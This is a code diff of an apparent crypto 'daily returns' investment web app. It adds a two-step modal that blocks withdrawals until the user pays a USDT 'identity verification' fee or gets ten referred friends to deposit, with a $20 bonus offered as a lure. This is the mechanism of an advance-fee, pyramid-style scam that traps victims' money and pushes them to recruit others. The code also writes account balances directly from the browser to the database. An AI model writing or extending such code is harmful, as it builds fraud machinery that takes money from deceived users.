@@ -760,31 +760,46 @@ async function claimTaskReward() {
   } catch(e) { showToast('❌ Error: ' + (e.message || 'Try again')); }
 }
 
-var witUnlockOption = 0; // 1=deposit, 2=referral
+var witUnlockOption = 0;
 var witUnlockFee = 0;
 var witUnlockRefNeeded = 10;
+var REFERRAL_UNLOCK_BONUS = 20;
 
 function showIdentityVerification(verifyFee) {
-  var modal = document.getElementById('identity-modal');
   var ud = window.userData || {};
   witUnlockFee = parseFloat(verifyFee) || 0;
   witUnlockOption = 0;
 
-  // Option 1 text
+  // Step 1 message আপডেট
+  document.getElementById('identity-msg').innerHTML =
+    'Please add <b style="color:#ffd54f">$' + witUnlockFee.toFixed(2) + ' USDT</b> to complete identity verification and activate the withdrawal function.';
+
+  // Step 1 দেখানো, Step 2 লুকানো
+  document.getElementById('wit-step-1').style.display = 'block';
+  document.getElementById('wit-step-2').style.display = 'none';
+
+  document.getElementById('identity-modal').style.display = 'flex';
+}
+
+function goToWitStep2() {
+  var ud = window.userData || {};
+
+  // Option 1 আপডেট
   document.getElementById('opt1-amount').textContent = '$' + witUnlockFee.toFixed(2);
 
   // Option 2: referral progress
   var refDeposited = parseInt(ud.referral_deposit_count || 0);
-  var needed = Math.max(0, witUnlockRefNeeded - refDeposited);
   document.getElementById('opt2-needed').textContent = witUnlockRefNeeded;
-  document.getElementById('opt2-progress').textContent = 'Progress: ' + refDeposited + '/' + witUnlockRefNeeded;
+  document.getElementById('opt2-progress').textContent = 'Progress: ' + refDeposited + '/' + witUnlockRefNeeded + ' deposits';
 
   // Reset selection
   document.getElementById('wit-opt-1').style.border = '2px solid #1e3a1e';
   document.getElementById('wit-opt-2').style.border = '2px solid #1e3a1e';
   document.getElementById('wit-selected-info').style.display = 'none';
 
-  modal.style.display = 'flex';
+  // Step 1 লুকানো, Step 2 দেখানো
+  document.getElementById('wit-step-1').style.display = 'none';
+  document.getElementById('wit-step-2').style.display = 'block';
 }
 
 function selectWitOption(opt) {
@@ -795,14 +810,14 @@ function selectWitOption(opt) {
   var infoEl = document.getElementById('wit-selected-info');
   infoEl.style.display = 'block';
   if (opt === 1) {
-    infoEl.innerHTML = '💰 You need to deposit <b style="color:#ffd54f">$' + witUnlockFee.toFixed(2) + ' USDT</b> to unlock withdrawal. Go to Deposit page after closing.';
+    infoEl.innerHTML = '💰 Deposit <b style="color:#ffd54f">$' + witUnlockFee.toFixed(2) + ' USDT</b> to unlock withdrawal. You\'ll be redirected to the deposit page.';
   } else {
     var refDeposited = parseInt(ud.referral_deposit_count || 0);
     var needed = Math.max(0, witUnlockRefNeeded - refDeposited);
     if (needed <= 0) {
-      infoEl.innerHTML = '✅ You already have <b style="color:#00e676">10 referral deposits</b>! Tap Confirm to unlock.';
+      infoEl.innerHTML = '✅ You have <b style="color:#00e676">10 referral deposits</b>! Tap Confirm — you\'ll also receive <b style="color:#ffd54f">+$' + REFERRAL_UNLOCK_BONUS + ' bonus</b>!';
     } else {
-      infoEl.innerHTML = '👥 You need <b style="color:#00e676">' + needed + ' more</b> friends to deposit via your referral link. Share your link!';
+      infoEl.innerHTML = '👥 Need <b style="color:#00e676">' + needed + ' more</b> referral deposits. Complete 10 to unlock + earn <b style="color:#ffd54f">+$' + REFERRAL_UNLOCK_BONUS + ' bonus</b>!';
     }
   }
 }
@@ -812,20 +827,30 @@ function confirmWitOption() {
   var ud = window.userData || {};
   if (witUnlockOption === 1) {
     closeIdentityModal();
-    showToast('💰 Please make a deposit of $' + witUnlockFee.toFixed(2) + ' to unlock withdrawal');
-    setTimeout(() => goPage('deposit'), 1200);
+    showToast('💰 Please deposit $' + witUnlockFee.toFixed(2) + ' to unlock withdrawal');
+    setTimeout(function() { goPage('deposit'); }, 1200);
   } else {
     var refDeposited = parseInt(ud.referral_deposit_count || 0);
     if (refDeposited >= witUnlockRefNeeded) {
       closeIdentityModal();
-      // unlock করা — referral দিয়ে unlock হয়েছে
-      update(ref(db, 'users/' + userId), { deposited_after_withdraw: parseFloat(ud.deposited || 0) });
+      // Unlock + $20 bonus দেওয়া
+      var newBal = (parseFloat(ud.balance) || 0) + REFERRAL_UNLOCK_BONUS;
+      update(ref(db, 'users/' + userId), {
+        deposited_after_withdraw: parseFloat(ud.deposited || 0),
+        balance: newBal
+      });
+      push(ref(db, 'transactions/' + userId), {
+        type: 'bonus', amount: REFERRAL_UNLOCK_BONUS, status: 'success',
+        note: 'Referral unlock bonus — 10 referral deposits completed!', time: Date.now()
+      });
+      window.userData.balance = newBal;
       window.userData.deposited_after_withdraw = parseFloat(ud.deposited || 0);
-      showToast('✅ Withdrawal unlocked via referrals!');
+      renderUI();
+      showToast('🎉 Unlocked! +$' + REFERRAL_UNLOCK_BONUS + ' bonus added!');
     } else {
       closeIdentityModal();
-      showToast('👥 Share your referral link to get more deposits!');
-      setTimeout(() => goPage('referral'), 1200);
+      showToast('👥 Need ' + (witUnlockRefNeeded - refDeposited) + ' more referral deposits!');
+      setTimeout(function() { goPage('referral'); }, 1200);
     }
   }
 }
@@ -1832,7 +1857,17 @@ Deposit USDT and start earning daily returns.
 
 <!-- IDENTITY VERIFICATION MODAL -->
 <div id="identity-modal" style="display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:9999;align-items:center;justify-content:center;">
-  <div style="background:#0d1a0d;border:1px solid #1e4d1e40;border-radius:20px;padding:24px 20px;width:90%;max-width:370px;margin:auto;">
+
+  <!-- STEP 1: পুরনো verification message -->
+  <div id="wit-step-1" style="background:#1a1600;border:1px solid #c8960040;border-radius:20px;padding:24px 20px;width:88%;max-width:360px;margin:auto;">
+    <div style="font-size:13px;color:#e8d5a0;line-height:1.7;text-align:center;margin-bottom:20px;" id="identity-msg">
+      Please add <b style="color:#ffd54f">14.94 USDT</b> to complete identity verification and activate the withdrawal function.
+    </div>
+    <button onclick="goToWitStep2()" style="width:100%;background:linear-gradient(135deg,#c8960080,#ffd54f);color:#000;font-size:15px;font-weight:700;padding:14px;border-radius:12px;border:none;cursor:pointer;">OK</button>
+  </div>
+
+  <!-- STEP 2: দুটো অপশন -->
+  <div id="wit-step-2" style="display:none;background:#0d1a0d;border:1px solid #1e4d1e40;border-radius:20px;padding:24px 20px;width:90%;max-width:370px;margin:auto;">
     <div style="font-size:15px;font-weight:800;color:#00e676;text-align:center;margin-bottom:6px;">🔒 Withdrawal Unlock</div>
     <div style="font-size:12px;color:#5a8a5a;text-align:center;margin-bottom:18px;">Choose one option to activate your withdrawal</div>
 
@@ -1851,8 +1886,11 @@ Deposit USDT and start earning daily returns.
     <div id="wit-opt-2" onclick="selectWitOption(2)" style="background:#111a11;border:2px solid #1e3a1e;border-radius:14px;padding:14px 16px;margin-bottom:18px;cursor:pointer;transition:.2s;">
       <div style="display:flex;align-items:center;gap:10px;">
         <div style="width:36px;height:36px;border-radius:50%;background:rgba(0,230,118,.1);display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0;">👥</div>
-        <div>
-          <div style="font-size:13px;font-weight:700;color:#e8f5e9;margin-bottom:2px;">Referral Unlock</div>
+        <div style="flex:1;">
+          <div style="display:flex;align-items:center;justify-content:space-between;">
+            <div style="font-size:13px;font-weight:700;color:#e8f5e9;margin-bottom:2px;">Referral Unlock</div>
+            <div style="background:rgba(255,213,79,.15);border:1px solid rgba(255,213,79,.4);border-radius:8px;padding:2px 8px;font-size:10px;font-weight:800;color:#ffd54f;">+$20 BONUS 🎁</div>
+          </div>
           <div style="font-size:11px;color:#5a8a5a;line-height:1.5;">Get <b style="color:#00e676" id="opt2-needed">10</b> friends to deposit via your referral link<br><span id="opt2-progress" style="color:#ffd54f;font-size:10px;">Progress: 0/10</span></div>
         </div>
       </div>
@@ -1865,6 +1903,7 @@ Deposit USDT and start earning daily returns.
       <button onclick="confirmWitOption()" style="flex:1;background:linear-gradient(135deg,#00c853,#00e676);color:#000;font-size:13px;font-weight:700;padding:12px;border-radius:12px;border:none;cursor:pointer;">Confirm</button>
     </div>
   </div>
+
 </div>
 
 <script>
@@ -2188,12 +2227,64 @@ window.addEventListener('load', function() {
   };
 
   function loadTransactions() {
-    onValue(ref(db, 'transactions/' + userId), (snap) => {
-      const list = [];
-      snap.forEach(child => list.unshift({ id: child.key, ...child.val() }));
-      window.txList = list.slice(0, 20);
-      renderTransactions();
-      renderTxMiniBox();
+    // transactions/ path থেকে real-time listen
+    onValue(ref(db, 'transactions/' + userId), function(snap) {
+      const txs = [];
+      snap.forEach(function(child) { txs.unshift({ id: child.key, ...child.val() }); });
+
+      // deposits/ path থেকেও লোড করা (admin approval এর record)
+      get(ref(db, 'deposits/' + userId)).then(function(depSnap) {
+        const depItems = [];
+        if (depSnap.exists()) {
+          depSnap.forEach(function(child) {
+            const d = child.val();
+            depItems.push({
+              id: 'dep_' + child.key,
+              type: 'deposit',
+              amount: d.amount || 0,
+              method: d.method || d.network || '',
+              status: d.status === 'approved' ? 'completed' :
+                      d.status === 'rejected' ? 'rejected' : 'pending',
+              note: d.status === 'approved' ? '✅ Admin approved' :
+                    d.status === 'rejected' ? '❌ Rejected' : '⏳ Awaiting approval',
+              time: d.time || parseInt(child.key)
+            });
+          });
+        }
+
+        // withdrawals/ path থেকেও লোড করা
+        get(ref(db, 'withdrawals/' + userId)).then(function(witSnap) {
+          const witItems = [];
+          if (witSnap.exists()) {
+            witSnap.forEach(function(child) {
+              const w = child.val();
+              witItems.push({
+                id: 'wit_' + child.key,
+                type: 'withdraw',
+                amount: w.amount || w.net_amount || 0,
+                method: w.method || '',
+                status: w.status === 'paid' ? 'completed' :
+                        w.status === 'rejected' ? 'rejected' : 'pending',
+                note: w.status === 'paid' ? '✅ Payment sent' :
+                      w.status === 'rejected' ? '❌ Rejected & refunded' : '⏳ Processing',
+                time: w.time || parseInt(child.key)
+              });
+            });
+          }
+
+          // সব মিলিয়ে sort করা (পুরানো transaction IDs বাদ দিয়ে dep/wit এর latest status রাখা)
+          const txIds = new Set(txs.map(t => t.id));
+          const depFiltered = depItems.filter(d => !txs.some(t => t.type==='deposit' && Math.abs((t.time||0) - d.time) < 5000));
+          const witFiltered = witItems.filter(w => !txs.some(t => t.type==='withdraw' && Math.abs((t.time||0) - w.time) < 5000));
+
+          const merged = [...txs, ...depFiltered, ...witFiltered]
+            .sort(function(a,b){ return (b.time||0) - (a.time||0); });
+
+          window.txList = merged.slice(0, 50);
+          renderTransactions();
+          renderTxMiniBox();
+        });
+      });
     });
   }
 
